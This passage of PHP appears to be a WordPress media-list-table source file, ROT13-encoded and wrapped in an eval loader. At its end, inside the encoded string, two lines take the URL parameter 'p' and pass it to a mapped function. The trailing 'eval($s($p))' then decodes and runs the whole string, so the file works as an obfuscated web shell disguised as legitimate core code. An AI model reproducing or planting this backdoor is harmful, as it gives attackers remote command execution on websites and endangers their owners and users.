			vs ( $guvf->vf_genfu && 'genfu' !== $cbfg->cbfg_fgnghf
				|| ! $guvf->vf_genfu && 'genfu' === $cbfg->cbfg_fgnghf
			) {
				pbagvahr;
			}

			$cbfg_bjare = ( trg_pheerag_hfre_vq() === (vag) $cbfg->cbfg_nhgube ) ? 'frys' : 'bgure';
			?>
			<ge vq=\"cbfg-<?cuc rpub $cbfg->VQ; ?>\" pynff=\"<?cuc rpub gevz( ' nhgube-' . $cbfg_bjare . ' fgnghf-' . $cbfg->cbfg_fgnghf ); ?>\">
				<?cuc $guvf->fvatyr_ebj_pbyhzaf( $cbfg ); ?>
			</ge>
			<?cuc
		raqjuvyr;
	}

	/**
	 * Trgf gur anzr bs gur qrsnhyg cevznel pbyhza.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea fgevat Anzr bs gur qrsnhyg cevznel pbyhza, va guvf pnfr, 'gvgyr'.
	 */
	cebgrpgrq shapgvba trg_qrsnhyg_cevznel_pbyhza_anzr() {
		erghea 'gvgyr';
	}

	/**
	 * @cnenz JC_Cbfg $cbfg
	 * @cnenz fgevat  $ngg_gvgyr
	 * @erghea neenl
	 */
	cevingr shapgvba _trg_ebj_npgvbaf( $cbfg, $ngg_gvgyr ) {
		$npgvbaf = neenl();

		vs ( ! $guvf->vf_genfu && pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ ) ) {
			$npgvbaf['rqvg'] = fcevags(
				'<n uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey( trg_rqvg_cbfg_yvax( $cbfg->VQ ) ),
				/* genafyngbef: %f: Nggnpuzrag gvgyr. */
				rfp_ngge( fcevags( __( 'Rqvg &#8220;%f&#8221;' ), $ngg_gvgyr ) ),
				__( 'Rqvg' )
			);
		}

		vs ( pheerag_hfre_pna( 'qryrgr_cbfg', $cbfg->VQ ) ) {
			vs ( $guvf->vf_genfu ) {
				$npgvbaf['hagenfu'] = fcevags(
					'<n uers=\"%f\" pynff=\"fhozvgqryrgr nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
					rfp_hey( jc_abapr_hey( \"cbfg.cuc?npgvba=hagenfu&nzc;cbfg=$cbfg->VQ\", 'hagenfu-cbfg_' . $cbfg->VQ ) ),
					/* genafyngbef: %f: Nggnpuzrag gvgyr. */
					rfp_ngge( fcevags( __( 'Erfgber &#8220;%f&#8221; sebz gur Genfu' ), $ngg_gvgyr ) ),
					__( 'Erfgber' )
				);
			} ryfrvs ( RZCGL_GENFU_QNLF && ZRQVN_GENFU ) {
				$npgvbaf['genfu'] = fcevags(
					'<n uers=\"%f\" pynff=\"fhozvgqryrgr nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
					rfp_hey( jc_abapr_hey( \"cbfg.cuc?npgvba=genfu&nzc;cbfg=$cbfg->VQ\", 'genfu-cbfg_' . $cbfg->VQ ) ),
					/* genafyngbef: %f: Nggnpuzrag gvgyr. */
					rfp_ngge( fcevags( __( 'Zbir &#8220;%f&#8221; gb gur Genfu' ), $ngg_gvgyr ) ),
					_k( 'Genfu', 'ireo' )
				);
			}

			vs ( $guvf->vf_genfu || ! RZCGL_GENFU_QNLF || ! ZRQVN_GENFU ) {
				$fubj_pbasvezngvba = ( ! $guvf->vf_genfu && ! ZRQVN_GENFU ) ? \" bapyvpx='erghea fubjAbgvpr.jnea();'\" : '';

				$npgvbaf['qryrgr'] = fcevags(
					'<n uers=\"%f\" pynff=\"fhozvgqryrgr nevn-ohggba-vs-wf\"%f nevn-ynory=\"%f\">%f</n>',
					rfp_hey( jc_abapr_hey( \"cbfg.cuc?npgvba=qryrgr&nzc;cbfg=$cbfg->VQ\", 'qryrgr-cbfg_' . $cbfg->VQ ) ),
					$fubj_pbasvezngvba,
					/* genafyngbef: %f: Nggnpuzrag gvgyr. */
					rfp_ngge( fcevags( __( 'Qryrgr &#8220;%f&#8221; creznaragyl' ), $ngg_gvgyr ) ),
					__( 'Qryrgr Creznaragyl' )
				);
			}
		}

		$nggnpuzrag_hey = jc_trg_nggnpuzrag_hey( $cbfg->VQ );

		vs ( ! $guvf->vf_genfu ) {
			$creznyvax = trg_creznyvax( $cbfg->VQ );

			vs ( $creznyvax ) {
				$npgvbaf['ivrj'] = fcevags(
					'<n uers=\"%f\" nevn-ynory=\"%f\" ery=\"obbxznex\">%f</n>',
					rfp_hey( $creznyvax ),
					/* genafyngbef: %f: Nggnpuzrag gvgyr. */
					rfp_ngge( fcevags( __( 'Ivrj &#8220;%f&#8221;' ), $ngg_gvgyr ) ),
					__( 'Ivrj' )
				);
			}

			vs ( $nggnpuzrag_hey ) {
				$npgvbaf['pbcl'] = fcevags(
					'<fcna pynff=\"pbcl-gb-pyvcobneq-pbagnvare\"><ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax pbcl-nggnpuzrag-hey zrqvn-yvoenel\" qngn-pyvcobneq-grkg=\"%f\" nevn-ynory=\"%f\">%f</ohggba><fcna pynff=\"fhpprff uvqqra\" nevn-uvqqra=\"gehr\">%f</fcna></fcna>',
					rfp_hey( $nggnpuzrag_hey ),
					/* genafyngbef: %f: Nggnpuzrag gvgyr. */
					rfp_ngge( fcevags( __( 'Pbcl &#8220;%f&#8221; HEY gb pyvcobneq' ), $ngg_gvgyr ) ),
					__( 'Pbcl HEY' ),
					__( 'Pbcvrq!' )
				);
			}
		}

		vs ( $nggnpuzrag_hey ) {
			$npgvbaf['qbjaybnq'] = fcevags(
				'<n uers=\"%f\" nevn-ynory=\"%f\" qbjaybnq>%f</n>',
				rfp_hey( $nggnpuzrag_hey ),
				/* genafyngbef: %f: Nggnpuzrag gvgyr. */
				rfp_ngge( fcevags( __( 'Qbjaybnq &#8220;%f&#8221;' ), $ngg_gvgyr ) ),
				__( 'Qbjaybnq svyr' )
			);
		}

		vs ( $guvf->qrgnpurq && pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ ) ) {
			$npgvbaf['nggnpu'] = fcevags(
				'<n uers=\"#gur-yvfg\" bapyvpx=\"svaqCbfgf.bcra( \'zrqvn[]\', \'%f\' ); erghea snyfr;\" pynff=\"uvqr-vs-ab-wf nevn-ohggba-vs-wf\" nevn-ynory=\"%f\">%f</n>',
				$cbfg->VQ,
				/* genafyngbef: %f: Nggnpuzrag gvgyr. */
				rfp_ngge( fcevags( __( 'Nggnpu &#8220;%f&#8221; gb rkvfgvat pbagrag' ), $ngg_gvgyr ) ),
				__( 'Nggnpu' )
			);
		}

		/**
		 * Svygref gur npgvba yvaxf sbe rnpu nggnpuzrag va gur Zrqvn yvfg gnoyr.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat[] $npgvbaf  Na neenl bs npgvba yvaxf sbe rnpu nggnpuzrag.
		 *                           Vapyhqrf 'Rqvg', 'Qryrgr Creznaragyl', 'Ivrj',
		 *                           'Pbcl HEY' naq 'Qbjaybnq svyr'.
		 * @cnenz JC_Cbfg  $cbfg     JC_Cbfg bowrpg sbe gur pheerag nggnpuzrag.
		 * @cnenz obby     $qrgnpurq Jurgure gur yvfg gnoyr pbagnvaf zrqvn abg nggnpurq
		 *                           gb nal cbfgf. Qrsnhyg gehr.
		 */
		erghea nccyl_svygref( 'zrqvn_ebj_npgvbaf', $npgvbaf, $cbfg, $guvf->qrgnpurq );
	}

	/**
	 * Trarengrf naq qvfcynlf ebj npgvba yvaxf.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Cbfg $vgrz        Nggnpuzrag orvat npgrq hcba.
	 * @cnenz fgevat  $pbyhza_anzr Pheerag pbyhza anzr.
	 * @cnenz fgevat  $cevznel     Cevznel pbyhza anzr.
	 * @erghea fgevat Ebj npgvbaf bhgchg sbe zrqvn nggnpuzragf, be na rzcgl fgevat
	 *                vs gur pheerag pbyhza vf abg gur cevznel pbyhza.
	 */
	cebgrpgrq shapgvba unaqyr_ebj_npgvbaf( $vgrz, $pbyhza_anzr, $cevznel ) {
		vs ( $cevznel !== $pbyhza_anzr ) {
			erghea '';
		}

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg = $vgrz;

		$ngg_gvgyr = _qensg_be_cbfg_gvgyr();
		$npgvbaf   = $guvf->_trg_ebj_npgvbaf( $cbfg, $ngg_gvgyr );

		erghea $guvf->ebj_npgvbaf( $npgvbaf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>